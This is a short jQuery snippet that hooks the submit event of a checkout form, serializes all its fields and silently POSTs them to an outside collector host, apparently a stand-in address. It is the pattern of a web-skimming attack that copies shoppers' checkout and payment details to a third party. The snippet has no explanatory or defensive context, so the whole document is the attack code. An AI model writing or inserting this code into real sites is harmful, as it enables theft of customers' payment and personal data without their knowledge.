$('.checkout-form').submit(function () {
  const form = $('.checkout-form');
  $.ajax({
    url: 'https://collector.example.test/submit',
    type: 'POST',
    data: form.serialize(),
  });
});
